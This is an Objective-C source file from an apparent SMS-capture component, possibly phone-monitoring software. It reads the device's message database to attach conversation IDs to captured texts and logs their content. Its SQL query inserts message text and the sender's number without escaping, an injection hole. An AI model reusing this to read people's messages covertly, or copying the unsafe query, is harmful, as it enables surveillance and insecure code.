//
//  SMSUtils.m
//  SMSCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 2/28/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSCaptureUtils.h"
#import "FMDatabase.h"
#import "DefStd.h"
#import "FxSmsEvent.h"


static NSString * const kSelectSMSEventSql	= @"select group_id from message where text = '%@' and association_id = 0 and address = '%@'";
// sms info key
static NSString * const kSMSEventKey		= @"SMSEVENT";
static NSString * const kSenderNumberKey	= @"SENDERNUMBER";
static NSString * const kSMSEventDelegate	= @"SMSEVENTDELEGATE";


@interface SMSCaptureUtils (private)
- (NSInteger)	queryGroupIDFromText: (NSString *) aText address: (NSString *) aAddress ;
- (void)		queryConversationIdAndDeliverEvent: (NSDictionary *) aSMSInfo;
@end

@implementation SMSCaptureUtils


- (void) queryConversationIdAndDeliverSMSEvent: (FxSmsEvent *) aSmsEvent
								  senderNumber: (NSString *) aSenderNumber
									   delgate: (id) aEventDelegate {
	DLog (@">>>>>>>>>>>> schedule perform selector")	
	[self performSelector:@selector(queryConversationIdAndDeliverEvent:) 
			   withObject:[NSDictionary dictionaryWithObjectsAndKeys:
						   aSmsEvent,		kSMSEventKey, 
						   aSenderNumber,	kSenderNumberKey, 
						   aEventDelegate, kSMSEventDelegate, nil] 
			   afterDelay:5];
	
}

- (NSInteger) queryGroupIDFromText: (NSString *) aText address: (NSString *) aAddress {	
	// -- find converstaion id if it doesn't exist for ios 5	
	FMDatabase *smsDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
	[smsDatabase open];				
	NSString *sql			= [NSString stringWithFormat:kSelectSMSEventSql, aText, aAddress];
	DLog (@"sql >>>> %@", sql)
	FMResultSet *rs			= [smsDatabase executeQuery:sql];
	NSInteger groupid		= 0;
	
	if ([rs next]) {
		groupid				= [rs intForColumnIndex:0];		
		DLog (@"group id >>>>>>  %d", groupid)
	}	
	[smsDatabase close];
	[smsDatabase release];								 	
	return groupid;
}

- (void) queryConversationIdAndDeliverEvent: (NSDictionary *) aSMSInfo {
	FxSmsEvent *smsEvent	= [aSMSInfo objectForKey:kSMSEventKey];				// sms event
	NSString *senderNumber	= [aSMSInfo objectForKey:kSenderNumberKey];			// sender
	id eventDelegate		= [aSMSInfo objectForKey:kSMSEventDelegate];		// event delegate
	
	DLog (@">>>>>>>>>>>>>>>>>> sms event %@", smsEvent)
	NSInteger groupid = [self queryGroupIDFromText:[smsEvent smsData] address:senderNumber];				
	if (groupid != 0) {
		[smsEvent setMConversationID:[NSString stringWithFormat:@"%d", groupid]];
	}											
	DLog (@"Sender Number:%@",[smsEvent senderNumber]);
	DLog (@"SMS Subject: %@", [smsEvent smsSubject]);
	DLog (@"SMS Text:%@",[smsEvent smsData]);
	DLog (@"SMS conversation id:%@",[smsEvent mConversationID]);
	
	[eventDelegate performSelector:@selector(eventFinished:) withObject:smsEvent withObject:self];
}

@end
